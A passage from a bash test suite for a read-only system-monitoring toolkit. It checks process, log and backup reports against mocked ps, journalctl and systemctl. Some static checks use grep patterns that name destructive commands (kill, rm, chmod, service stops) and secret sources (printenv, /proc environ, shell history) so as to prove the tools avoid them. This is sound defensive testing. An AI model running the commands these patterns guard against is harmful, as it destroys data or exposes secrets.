        ok "process-info alerts on a process exceeding the documented 90% CPU threshold"
    else
        bad "process-info did not alert on the high-CPU mocked process"
    fi
else
    bad "process-info failed on the highcpu mocked scenario: $(cat /tmp/toolkit_test_process_highcpu.err)"
fi

if PROCESS_MOCK_SCENARIO=highmem PATH="$MOCK_PATH" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_highmem.out 2>/tmp/toolkit_test_process_highmem.err; then
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_process_highmem.out | grep -qE '1 process\(es\) above 90% memory'; then
        ok "process-info alerts on a process exceeding the documented 90% memory threshold"
    else
        bad "process-info did not alert on the high-memory mocked process"
    fi
else
    bad "process-info failed on the highmem mocked scenario: $(cat /tmp/toolkit_test_process_highmem.err)"
fi

if PROCESS_MOCK_SCENARIO=zombie PATH="$MOCK_PATH" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_zombie.out 2>/tmp/toolkit_test_process_zombie.err; then
    if grep -qE '^Zombie +1$' /tmp/toolkit_test_process_zombie.out && \
       grep -A5 '^ALERTS$' /tmp/toolkit_test_process_zombie.out | grep -qE '1 zombie process\(es\)'; then
        ok "process-info detects and alerts on a mocked zombie process"
    else
        bad "process-info did not detect/alert on the mocked zombie process"
    fi
else
    bad "process-info failed on the zombie mocked scenario: $(cat /tmp/toolkit_test_process_zombie.err)"
fi

if PROCESS_MOCK_SCENARIO=manyprocs PATH="$MOCK_PATH" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_many.out 2>/tmp/toolkit_test_process_many.err; then
    cpu_rows="$(awk '/^TOP CPU$/{f=1; next} /^$/{f=0} f && $1 ~ /^[0-9]+$/' /tmp/toolkit_test_process_many.out | wc -l | tr -d '[:space:]')"
    if [[ "$cpu_rows" -eq 5 ]]; then
        ok "process-info bounds TOP CPU to exactly 5 rows even with 10 mocked processes"
    else
        bad "process-info TOP CPU was not bounded to 5 rows (got $cpu_rows)"
    fi
else
    bad "process-info failed on the manyprocs mocked scenario: $(cat /tmp/toolkit_test_process_many.err)"
fi

COUNTER_FILE="$(mktemp)"
if PROCESS_MOCK_SCENARIO=manyprocs PROCESS_MOCK_COUNTER_FILE="$COUNTER_FILE" PATH="$MOCK_PATH" \
    "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_onecall.out 2>/tmp/toolkit_test_process_onecall.err; then
    call_count="$(wc -l <"$COUNTER_FILE" | tr -d '[:space:]')"
    if [[ "$call_count" -eq 1 ]]; then
        ok "process-info takes exactly one ps snapshot (no per-PID subprocess spawning)"
    else
        bad "process-info invoked ps ${call_count} times instead of exactly once"
    fi
else
    bad "process-info failed while counting ps invocations: $(cat /tmp/toolkit_test_process_onecall.err)"
fi
rm -f "$COUNTER_FILE"
rm -rf "$MOCK_DIR"

echo "== process-info handles ps unavailable =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/ps"
chmod +x "${STUB_DIR}/ps"
if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/process-info" >/tmp/toolkit_test_process_nops.out 2>/tmp/toolkit_test_process_nops.err; then
    if grep -A2 '^PROCESS OVERVIEW$' /tmp/toolkit_test_process_nops.out | grep -q 'N/A' && \
       grep -A2 '^TOP CPU$' /tmp/toolkit_test_process_nops.out | grep -q 'N/A'; then
        ok "process-info reports N/A throughout and still exits 0 when ps is unavailable"
    else
        bad "process-info did not degrade gracefully when ps was unavailable"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_process_nops.out | grep -q 'No process anomalies'; then
        ok "process-info does not raise a false alert when ps is simply unavailable"
    else
        bad "process-info raised an unexpected alert when ps was unavailable"
    fi
    if grep -q '^SYSTEM LOAD$' /tmp/toolkit_test_process_nops.out; then
        ok "process-info's SYSTEM LOAD section is unaffected by ps being unavailable (independent /proc/loadavg source)"
    else
        bad "process-info's SYSTEM LOAD section was missing when ps was unavailable"
    fi
else
    bad "process-info failed (nonzero exit) when ps was unavailable: $(cat /tmp/toolkit_test_process_nops.err)"
fi
rm -rf "$STUB_DIR"

echo "== process-info: no state-changing/destructive commands present (static check) =="
if ! grep -nE '(^|[^A-Za-z0-9_.-])(kill|pkill|killall|renice)\b' \
    "${TOOLKIT_DIR}/lib/process.sh" "${BIN_DIR}/process-info" | grep -v '^\s*#'; then
    ok "process.sh / process-info contain no kill/pkill/killall/renice invocations"
else
    bad "process.sh / process-info appear to invoke kill/pkill/killall/renice"
fi
if ! grep -nE 'systemctl +(start|stop|restart|reload|enable|disable|mask|unmask)\b|(^|[^A-Za-z0-9_])service +[A-Za-z0-9._-]+ +(start|stop|restart|reload)\b' \
    "${TOOLKIT_DIR}/lib/process.sh" "${BIN_DIR}/process-info"; then
    ok "process.sh / process-info contain no systemctl/service state-changing invocations"
else
    bad "process.sh / process-info appear to invoke a state-changing systemctl/service command"
fi
if ! grep -nE '(^|[^A-Za-z0-9_.])(chmod|chown|rm|truncate|apt|apt-get|dnf|yum|pacman|sysctl)\b[^=]' \
    "${TOOLKIT_DIR}/lib/process.sh" "${BIN_DIR}/process-info"; then
    ok "process.sh / process-info contain no chmod/chown/rm/truncate/package-manager/sysctl invocations"
else
    bad "process.sh / process-info appear to invoke a filesystem/package/kernel-parameter-modifying command"
fi
if ! grep -nE '\beval\b' "${TOOLKIT_DIR}/lib/process.sh" "${BIN_DIR}/process-info"; then
    ok "process.sh / process-info never eval process data"
else
    bad "process.sh / process-info appear to use eval"
fi

echo "== no lingering process-info background processes =="
sleep 1
proc_leftover="$(pgrep -f 'toolkit_test_process|PROCESS_MOCK_SCENARIO' 2>/dev/null || true)"
if [[ -z "$proc_leftover" ]]; then
    ok "no lingering mocked-ps or process-info processes"
else
    bad "found lingering process(es): $proc_leftover"
fi

echo "== logs-info runs successfully (live host) =="
if "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs.out 2>/tmp/toolkit_test_logs.err; then
    ok "logs-info exits 0"
    if grep -q '^LOG SUMMARY$' /tmp/toolkit_test_logs.out && grep -q '^ERRORS$' /tmp/toolkit_test_logs.out && \
       grep -q '^RECENT EVENTS$' /tmp/toolkit_test_logs.out && grep -q '^KERNEL$' /tmp/toolkit_test_logs.out; then
        ok "logs-info prints LOG SUMMARY, ERRORS, RECENT EVENTS and KERNEL sections"
    else
        bad "logs-info output is missing expected sections"
    fi
    if grep -qE '^Window +Last 24 hours$' /tmp/toolkit_test_logs.out; then
        ok "logs-info clearly states the 24-hour window"
    else
        bad "logs-info did not clearly state the time window"
    fi
else
    bad "logs-info exited non-zero: $(cat /tmp/toolkit_test_logs.err)"
fi

echo "== logs.sh pure-function tests (truncate_text, malformed jq input) =="
trunc_short="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/logs.sh"
    truncate_text "short message" 80
')"
trunc_long="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/logs.sh"
    truncate_text "$(printf "A%.0s" {1..200})" 80
')"
if [[ "$trunc_short" == "short message" ]] && [[ "${#trunc_long}" -eq 80 ]] && [[ "$trunc_long" == *"..." ]]; then
    ok "truncate_text passes short text through and bounds+ellipsizes long text to exactly the max length"
else
    bad "truncate_text mismatch: short='$trunc_short' long_len=${#trunc_long}"
fi

echo "== logs-info mocked scenarios (journalctl/systemctl scripted) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/journalctl" <<'MOCKEOF'
#!/usr/bin/env bash
# Scripted `journalctl` for logs-info tests. Behavior selected by
# $LOGS_MOCK_SCENARIO. Read-only responses only. Counts its own invocations
# (if $LOGS_MOCK_COUNTER_FILE is set) so tests can prove logs-info makes a
# small fixed number of calls rather than one per event.
scenario="${LOGS_MOCK_SCENARIO:-normal}"
[[ -n "${LOGS_MOCK_COUNTER_FILE:-}" ]] && printf 'x\n' >>"$LOGS_MOCK_COUNTER_FILE"

if [[ "$scenario" == "denied" ]]; then
    printf 'Permission denied\n' >&2
    exit 1
fi
if [[ "$scenario" == "timeout" ]]; then
    sleep 30
    exit 0
fi

if [[ "${1:-}" == "--version" ]]; then
    printf 'systemd 255 (255.4-1ubuntu8.17)\n'
    exit 0
fi

is_kernel=0
for a in "$@"; do [[ "$a" == "-k" ]] && is_kernel=1; done

if [[ "$*" == *"-o json"* ]]; then
    case "$scenario" in
        empty) : ;;
        malformed)
            printf '{"MESSAGE":"a valid entry","PRIORITY":"3","__REALTIME_TIMESTAMP":"1700000000000000","_SYSTEMD_UNIT":"foo.service"}\n'
            printf 'not even json\n'
            ;;
        missingfields)
            printf '{"MESSAGE":"no priority or unit here"}\n'
            ;;
        longmessage)
            printf '{"MESSAGE":"%s","PRIORITY":"3","__REALTIME_TIMESTAMP":"1700000000000000","_SYSTEMD_UNIT":"foo.service"}\n' \
                "$(printf 'A%.0s' $(seq 1 200))"
            ;;
        manyevents)
            for i in $(seq 1 50); do
                printf '{"MESSAGE":"event number %d","PRIORITY":"3","__REALTIME_TIMESTAMP":"1700000000000000","_SYSTEMD_UNIT":"svc%d.service"}\n' "$i" "$i"
            done
            ;;
        *)
            printf '{"MESSAGE":"disk space low on /data","PRIORITY":"4","__REALTIME_TIMESTAMP":"1700000000000000","_SYSTEMD_UNIT":"diskcheck.service"}\n'
            printf '{"MESSAGE":"connection refused","PRIORITY":"3","__REALTIME_TIMESTAMP":"1700000060000000","_SYSTEMD_UNIT":"api.service"}\n'
            ;;
    esac
elif [[ "$is_kernel" -eq 1 ]]; then
    case "$scenario" in
        empty) : ;;
        kernelunavailable) exit 1 ;;
        kernelcounts) printf 'k1\nk2\nk3\n' ;;
        *) : ;;
    esac
elif [[ "$*" == *"warning..warning"* ]]; then
    case "$scenario" in
        empty) : ;;
        counts) printf 'w1\nw2\nw3\nw4\nw5\n' ;;
        highwarnings) for i in $(seq 1 60); do printf 'w%d\n' "$i"; done ;;
        *) : ;;
    esac
elif [[ "$*" == *"err..emerg"* ]]; then
    case "$scenario" in
        empty) : ;;
        counts) printf 'e1\ne2\n' ;;
        *) : ;;
    esac
fi
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/journalctl"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if LOGS_MOCK_SCENARIO=normal PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_normal.out 2>/tmp/toolkit_test_logs_normal.err; then
    if grep -qE '^0\.0\.0\.0' /tmp/toolkit_test_logs_normal.out; then
        bad "logs-info leaked unrelated network data (sanity check failed)"
    else
        ok "logs-info mocked normal scenario ran without unrelated leakage"
    fi
    if grep -qE 'diskcheck\.service' /tmp/toolkit_test_logs_normal.out; then
        ok "logs-info RECENT EVENTS shows the mocked unit/source correctly"
    else
        bad "logs-info RECENT EVENTS did not show the expected mocked unit"
    fi
    if grep -qE 'diskcheck\.service +warning +disk space low on /data$' /tmp/toolkit_test_logs_normal.out; then
        ok "logs-info RECENT EVENTS renders priority and message correctly (mocked)"
    else
        bad "logs-info RECENT EVENTS row did not match expected priority/message"
    fi
else
    bad "logs-info failed on the normal mocked scenario: $(cat /tmp/toolkit_test_logs_normal.err)"
fi

if LOGS_MOCK_SCENARIO=empty PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_empty.out 2>/tmp/toolkit_test_logs_empty.err; then
    if grep -qE '^Errors +0$' /tmp/toolkit_test_logs_empty.out && grep -qE '^Warnings +0$' /tmp/toolkit_test_logs_empty.out; then
        ok "logs-info reports 0/0 for a genuinely empty journal (not N/A)"
    else
        bad "logs-info did not report 0 counts correctly for an empty journal"
    fi
    if grep -A2 '^RECENT EVENTS$' /tmp/toolkit_test_logs_empty.out | grep -q 'None'; then
        ok "logs-info shows 'None' for RECENT EVENTS with an empty journal"
    else
        bad "logs-info did not show 'None' for empty recent events"
    fi
    if grep -qE '^Errors/warnings +0$' /tmp/toolkit_test_logs_empty.out; then
        ok "logs-info reports 0 kernel events for an empty journal"
    else
        bad "logs-info did not report 0 kernel events correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_logs_empty.out | grep -q 'No recent log anomalies'; then
        ok "logs-info raises no alert for a completely clean/empty journal"
    else
        bad "logs-info raised an unexpected alert for an empty journal"
    fi
else
    bad "logs-info failed on the empty mocked scenario: $(cat /tmp/toolkit_test_logs_empty.err)"
fi

if LOGS_MOCK_SCENARIO=counts PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_counts.out 2>/tmp/toolkit_test_logs_counts.err; then
    if grep -qE '^Errors +2$' /tmp/toolkit_test_logs_counts.out && grep -qE '^Warnings +5$' /tmp/toolkit_test_logs_counts.out; then
        ok "logs-info parses mocked error (2) and warning (5) counts correctly"
    else
        bad "logs-info did not parse the mocked error/warning counts correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_logs_counts.out | grep -qE '2 error-level journal entries in the last 24h'; then
        ok "logs-info alerts on a nonzero error count"
    else
        bad "logs-info did not alert on the mocked error count"
    fi
else
    bad "logs-info failed on the counts mocked scenario: $(cat /tmp/toolkit_test_logs_counts.err)"
fi

if LOGS_MOCK_SCENARIO=highwarnings PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_highwarn.out 2>/tmp/toolkit_test_logs_highwarn.err; then
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_logs_highwarn.out | grep -qE '60 warning-level journal entries.*>= 50'; then
        ok "logs-info alerts when warnings reach the documented threshold (60 >= 50)"
    else
        bad "logs-info did not alert on warnings above the documented threshold"
    fi
else
    bad "logs-info failed on the highwarnings mocked scenario: $(cat /tmp/toolkit_test_logs_highwarn.err)"
fi

if LOGS_MOCK_SCENARIO=longmessage PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_longmsg.out 2>/tmp/toolkit_test_logs_longmsg.err; then
    if grep -q '\.\.\.$' /tmp/toolkit_test_logs_longmsg.out; then
        ok "logs-info truncates a long log message for display (mocked)"
    else
        bad "logs-info did not truncate the mocked long message"
    fi
    if awk '{ if (length($0) > 200) found=1 } END { exit !found }' /tmp/toolkit_test_logs_longmsg.out; then
        bad "logs-info printed an unbounded-length line for the long message"
    else
        ok "logs-info kept output lines bounded even with a very long source message"
    fi
else
    bad "logs-info failed on the longmessage mocked scenario: $(cat /tmp/toolkit_test_logs_longmsg.err)"
fi

if LOGS_MOCK_SCENARIO=malformed PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_malformed.out 2>/tmp/toolkit_test_logs_malformed.err; then
    ok "logs-info tolerates a malformed (non-JSON) journal line without crashing"
    if grep -q 'a valid entry' /tmp/toolkit_test_logs_malformed.out; then
        ok "logs-info still shows the valid entry parsed before the malformed one"
    else
        bad "logs-info lost the valid entry when a malformed line followed it"
    fi
else
    bad "logs-info crashed on malformed journal output: $(cat /tmp/toolkit_test_logs_malformed.err)"
fi

if LOGS_MOCK_SCENARIO=missingfields PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_missingfields.out 2>/tmp/toolkit_test_logs_missingfields.err; then
    ok "logs-info tolerates a journal entry missing priority/unit fields without crashing"
else
    bad "logs-info crashed on a journal entry with missing fields: $(cat /tmp/toolkit_test_logs_missingfields.err)"
fi

if LOGS_MOCK_SCENARIO=manyevents PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_many.out 2>/tmp/toolkit_test_logs_many.err; then
    event_rows="$(awk '/^RECENT EVENTS$/{f=1; next} /^$/{f=0} f && /^[0-9]{4}-/' /tmp/toolkit_test_logs_many.out | wc -l | tr -d '[:space:]')"
    if [[ "$event_rows" -eq 10 ]]; then
        ok "logs-info bounds RECENT EVENTS to exactly 10 rows even with 50 mocked events"
    else
        bad "logs-info RECENT EVENTS was not bounded to 10 rows (got $event_rows)"
    fi
else
    bad "logs-info failed on the manyevents mocked scenario: $(cat /tmp/toolkit_test_logs_many.err)"
fi

if LOGS_MOCK_SCENARIO=kernelcounts PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_kernel.out 2>/tmp/toolkit_test_logs_kernel.err; then
    if grep -qE '^Errors/warnings +3$' /tmp/toolkit_test_logs_kernel.out; then
        ok "logs-info reports the mocked kernel event count correctly"
    else
        bad "logs-info did not report the mocked kernel event count correctly"
    fi
else
    bad "logs-info failed on the kernelcounts mocked scenario: $(cat /tmp/toolkit_test_logs_kernel.err)"
fi

if LOGS_MOCK_SCENARIO=kernelunavailable PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_nokernel.out 2>/tmp/toolkit_test_logs_nokernel.err; then
    if grep -qE '^Errors/warnings +N/A$' /tmp/toolkit_test_logs_nokernel.out; then
        ok "logs-info reports kernel events as N/A when the kernel log query fails (e.g. permission)"
    else
        bad "logs-info did not report N/A for an unavailable kernel log"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_logs_nokernel.out | grep -qi 'kernel'; then
        bad "logs-info incorrectly alerted merely because kernel data was unavailable"
    else
        ok "logs-info does not alert merely because kernel log data is unavailable"
    fi
else
    bad "logs-info failed on the kernelunavailable mocked scenario: $(cat /tmp/toolkit_test_logs_nokernel.err)"
fi

if LOGS_MOCK_SCENARIO=denied PATH="$MOCK_PATH" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_denied.out 2>/tmp/toolkit_test_logs_denied.err; then
    if grep -qE '^Errors +N/A$' /tmp/toolkit_test_logs_denied.out && grep -qE '^Warnings +N/A$' /tmp/toolkit_test_logs_denied.out; then
        ok "logs-info reports N/A across the board on permission-denied journal access, without crashing"
    else
        bad "logs-info did not gracefully report N/A on permission-denied journal access"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_logs_denied.out | grep -q 'No recent log anomalies'; then
        ok "logs-info raises no false alert when journal access is denied (N/A is not a problem signal)"
    else
        bad "logs-info incorrectly alerted when journal access was simply denied"
    fi
else
    bad "logs-info failed (nonzero exit) on permission-denied journal access: $(cat /tmp/toolkit_test_logs_denied.err)"
fi

start_ts=$(date +%s)
if LOGS_MOCK_SCENARIO=timeout PATH="$MOCK_PATH" timeout 20 "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_timeout.out 2>/tmp/toolkit_test_logs_timeout.err; then
    end_ts=$(date +%s)
    elapsed=$(( end_ts - start_ts ))
    if [[ "$elapsed" -lt 15 ]] && grep -qE '^Errors +N/A$' /tmp/toolkit_test_logs_timeout.out; then
        ok "logs-info bounds a hanging journalctl with its internal per-call timeout (finished in ${elapsed}s, reported N/A)"
    else
        bad "logs-info did not bound the hanging journalctl correctly (elapsed=${elapsed}s)"
    fi
else
    bad "logs-info did not complete within the outer 20s safety timeout when journalctl hung on every call"
fi

COUNTER_FILE="$(mktemp)"
if LOGS_MOCK_SCENARIO=manyevents LOGS_MOCK_COUNTER_FILE="$COUNTER_FILE" PATH="$MOCK_PATH" \
    "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_onecall.out 2>/tmp/toolkit_test_logs_onecall.err; then
    call_count="$(wc -l <"$COUNTER_FILE" | tr -d '[:space:]')"
    if [[ "$call_count" -le 5 ]]; then
        ok "logs-info makes a small fixed number of journalctl calls (${call_count}), not one per event"
    else
        bad "logs-info invoked journalctl ${call_count} times - expected a small fixed number, not scaling with event count"
    fi
else
    bad "logs-info failed while counting journalctl invocations: $(cat /tmp/toolkit_test_logs_onecall.err)"
fi
rm -f "$COUNTER_FILE"
rm -rf "$MOCK_DIR"

echo "== logs-info handles journalctl unavailable =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/journalctl"
chmod +x "${STUB_DIR}/journalctl"
if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_nojournalctl.out 2>/tmp/toolkit_test_logs_nojournalctl.err; then
    if grep -A3 '^LOG SUMMARY$' /tmp/toolkit_test_logs_nojournalctl.out | grep -qE 'Journal +N/A'; then
        ok "logs-info reports Journal: N/A and exits 0 when journalctl is unavailable"
    else
        bad "logs-info did not report Journal: N/A when journalctl was unavailable"
    fi
    if grep -qE '^Errors +N/A$' /tmp/toolkit_test_logs_nojournalctl.out; then
        ok "logs-info propagates N/A to ERRORS when journalctl is unavailable"
    else
        bad "logs-info did not propagate N/A to ERRORS when journalctl was unavailable"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_logs_nojournalctl.out | grep -q 'No recent log anomalies'; then
        ok "logs-info does not alert merely because journalctl is unavailable"
    else
        bad "logs-info incorrectly alerted when journalctl was simply unavailable"
    fi
else
    bad "logs-info failed when journalctl was unavailable: $(cat /tmp/toolkit_test_logs_nojournalctl.err)"
fi
rm -rf "$STUB_DIR"

echo "== logs-info handles systemd unavailable (failed-service section) =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/systemctl"
chmod +x "${STUB_DIR}/systemctl"
if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_nosystemd.out 2>/tmp/toolkit_test_logs_nosystemd.err; then
    if grep -A3 '^FAILED SERVICES$' /tmp/toolkit_test_logs_nosystemd.out | grep -qE '^Count +N/A$'; then
        ok "logs-info reports FAILED SERVICES Count: N/A when systemd is unavailable"
    else
        bad "logs-info did not report N/A for failed services when systemd was unavailable"
    fi
else
    bad "logs-info failed when systemctl was unavailable: $(cat /tmp/toolkit_test_logs_nosystemd.err)"
fi
rm -rf "$STUB_DIR"

echo "== logs-info handles jq unavailable (recent events degrade gracefully) =="
STUB_DIR="$(mktemp -d)"
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/jq"
chmod +x "${STUB_DIR}/jq"
if PATH="${STUB_DIR}:${PATH}" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_nojq.out 2>/tmp/toolkit_test_logs_nojq.err; then
    if grep -A2 '^RECENT EVENTS$' /tmp/toolkit_test_logs_nojq.out | grep -q 'N/A'; then
        ok "logs-info reports RECENT EVENTS: N/A gracefully when jq is unavailable"
    else
        bad "logs-info did not gracefully handle jq being unavailable"
    fi
else
    bad "logs-info failed when jq was unavailable: $(cat /tmp/toolkit_test_logs_nojq.err)"
fi
rm -rf "$STUB_DIR"

echo "== logs-info: failed-service integration (mocked systemctl) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/systemctl" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${LOGS_MOCK_SVC_SCENARIO:-zero}"
case "$1" in
    --version) printf 'systemd 255\n' ;;
    list-units)
        if [[ "$*" == *"--failed"* && "$scenario" == "nonzero" ]]; then
            printf 'broken-a.service loaded failed failed A broken service\n'
            printf 'broken-b.service loaded failed failed Another broken service\n'
        fi
        ;;
esac
exit 0
MOCKEOF
cat >"${MOCK_DIR}/journalctl" <<'MOCKEOF'
#!/usr/bin/env bash
[[ "${1:-}" == "--version" ]] && { printf 'systemd 255\n'; exit 0; }
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/systemctl" "${MOCK_DIR}/journalctl"

if LOGS_MOCK_SVC_SCENARIO=zero PATH="${MOCK_DIR}:${PATH}" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_svczero.out 2>/tmp/toolkit_test_logs_svczero.err; then
    if grep -A3 '^FAILED SERVICES$' /tmp/toolkit_test_logs_svczero.out | grep -qE '^Count +0$'; then
        ok "logs-info reports 0 failed services and raises no alert for it (mocked, reusing services.sh)"
    else
        bad "logs-info did not report 0 failed services correctly"
    fi
else
    bad "logs-info failed on the zero-failed-services mocked scenario: $(cat /tmp/toolkit_test_logs_svczero.err)"
fi

if LOGS_MOCK_SVC_SCENARIO=nonzero PATH="${MOCK_DIR}:${PATH}" "${BIN_DIR}/logs-info" >/tmp/toolkit_test_logs_svcnonzero.out 2>/tmp/toolkit_test_logs_svcnonzero.err; then
    if grep -A3 '^FAILED SERVICES$' /tmp/toolkit_test_logs_svcnonzero.out | grep -qE '^Count +2$'; then
        ok "logs-info reports 2 failed services via services.sh reuse (mocked)"
    else
        bad "logs-info did not report 2 failed services correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_logs_svcnonzero.out | grep -qi '2 failed systemd service'; then
        ok "logs-info alerts on nonzero failed services"
    else
        bad "logs-info did not alert on the mocked failed services"
    fi
else
    bad "logs-info failed on the nonzero-failed-services mocked scenario: $(cat /tmp/toolkit_test_logs_svcnonzero.err)"
fi
rm -rf "$MOCK_DIR"

echo "== logs-info does not collect secrets/environment data (static check) =="
if ! grep -nE '\b(printenv|/proc/[^ ]*/environ|HISTFILE|\.bash_history|\.zsh_history)\b' \
    "${TOOLKIT_DIR}/lib/logs.sh" "${BIN_DIR}/logs-info"; then
    ok "logs.sh / logs-info do not reference environment-dump or shell-history sources"
else
    bad "logs.sh / logs-info appear to reference an environment-dump or shell-history source"
fi
if ! grep -nE '(^|[^A-Za-z0-9_.-])env\b' "${TOOLKIT_DIR}/lib/logs.sh" "${BIN_DIR}/logs-info" | grep -v '#!/usr/bin/env'; then
    ok "logs.sh / logs-info do not invoke 'env' to dump environment variables"
else
    bad "logs.sh / logs-info appear to invoke 'env'"
fi

echo "== logs-info: no state-changing/destructive commands present (static check) =="
if ! grep -nE 'journalctl[^|&;]*(--vacuum|--rotate|--flush)\b' \
    "${TOOLKIT_DIR}/lib/logs.sh" "${BIN_DIR}/logs-info"; then
    ok "logs.sh / logs-info contain no journalctl --vacuum/--rotate/--flush invocations"
else
    bad "logs.sh / logs-info appear to invoke a state-changing journalctl command"
fi
if ! grep -nE 'systemctl +(start|stop|restart|reload|enable|disable|mask|unmask)\b|(^|[^A-Za-z0-9_])service +[A-Za-z0-9._-]+ +(start|stop|restart|reload)\b' \
    "${TOOLKIT_DIR}/lib/logs.sh" "${BIN_DIR}/logs-info"; then
    ok "logs.sh / logs-info contain no systemctl/service state-changing invocations"
else
    bad "logs.sh / logs-info appear to invoke a state-changing systemctl/service command"
fi
if ! grep -nE '(^|[^A-Za-z0-9_.])(kill|pkill|killall|rm|truncate|chmod|chown)\b' \
    "${TOOLKIT_DIR}/lib/logs.sh" "${BIN_DIR}/logs-info"; then
    ok "logs.sh / logs-info contain no kill/pkill/killall/rm/truncate/chmod/chown invocations"
else
    bad "logs.sh / logs-info appear to invoke a process-killing or filesystem-modifying command"
fi
if ! grep -nE '\bsed\b[^|]*-i\b|\beval\b|\btee\b' "${TOOLKIT_DIR}/lib/logs.sh" "${BIN_DIR}/logs-info"; then
    ok "logs.sh / logs-info contain no sed -i/eval/tee invocations"
else
    bad "logs.sh / logs-info appear to invoke sed -i, eval, or tee"
fi
if ! grep -nE '>>?\s*/(etc|home|var/log|boot)' "${TOOLKIT_DIR}/lib/logs.sh" "${BIN_DIR}/logs-info"; then
    ok "logs.sh / logs-info contain no redirection writing to real system paths"
else
    bad "logs.sh / logs-info appear to redirect output to a real filesystem path"
fi

echo "== no lingering logs-info background processes =="
sleep 1
logs_leftover="$(pgrep -f 'LOGS_MOCK_SCENARIO|toolkit_test_logs' 2>/dev/null || true)"
if [[ -z "$logs_leftover" ]]; then
    ok "no lingering mocked-journalctl or logs-info processes"
else
    bad "found lingering process(es): $logs_leftover"
fi

echo "== backup-info runs successfully (live host) =="
if "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup.out 2>/tmp/toolkit_test_backup.err; then
    ok "backup-info exits 0"
    if grep -q '^BACKUP STATUS$' /tmp/toolkit_test_backup.out; then
        ok "backup-info prints BACKUP STATUS section"
    else
        bad "backup-info output is missing the BACKUP STATUS section"
    fi
else
    bad "backup-info exited non-zero: $(cat /tmp/toolkit_test_backup.err)"
fi

echo "== backup.sh pure-function tests: age/timestamp handling =="
age_fresh="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    backup_age_from_epoch "$(( $(date +%s) - 3600 ))"
')"
age_stale="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    backup_age_from_epoch "$(( $(date +%s) - 100000 ))"
')"
age_future="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    backup_age_from_epoch "$(( $(date +%s) + 3600 ))"
')"
age_malformed="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    backup_age_from_epoch "not-a-number"
')"
age_empty="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    backup_age_from_epoch ""
')"
IFS='|' read -r fresh_str fresh_hrs <<<"$age_fresh"
IFS='|' read -r _stale_str stale_hrs <<<"$age_stale"
if [[ "$fresh_str" == "1h 0m" && "$fresh_hrs" -eq 1 ]]; then
    ok "backup_age_from_epoch computes a fresh (1h-old) duration and hour count correctly"
else
    bad "backup_age_from_epoch fresh mismatch: '$age_fresh'"
fi
if [[ "$stale_hrs" -ge 24 ]]; then
    ok "backup_age_from_epoch computes a stale (>24h-old) hour count correctly"
else
    bad "backup_age_from_epoch stale mismatch: '$age_stale'"
fi
if [[ "$age_future" == "N/A|" ]] && [[ "$age_malformed" == "N/A|" ]] && [[ "$age_empty" == "N/A|" ]]; then
    ok "backup_age_from_epoch reports N/A (not stale, not a guess) for future/malformed/empty timestamps"
else
    bad "backup_age_from_epoch did not handle invalid timestamps correctly: future='$age_future' malformed='$age_malformed' empty='$age_empty'"
fi

ts_epoch="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
